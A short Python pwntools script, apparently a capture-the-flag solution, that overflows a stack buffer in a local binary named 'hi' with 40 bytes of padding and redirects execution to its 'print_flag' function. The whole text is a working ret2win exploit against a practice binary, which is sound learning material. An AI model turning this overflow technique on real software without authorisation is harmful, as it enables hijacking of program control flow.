from pwn import *

elf = ELF('./hi')
target_address = p64(elf.symbols['print_flag'])

garbage = b'a'*(32+8)
msgin = garbage + target_address

p = process('./hi')
p.sendline(msgin)
msgout = p.recvall()
print(msgout)
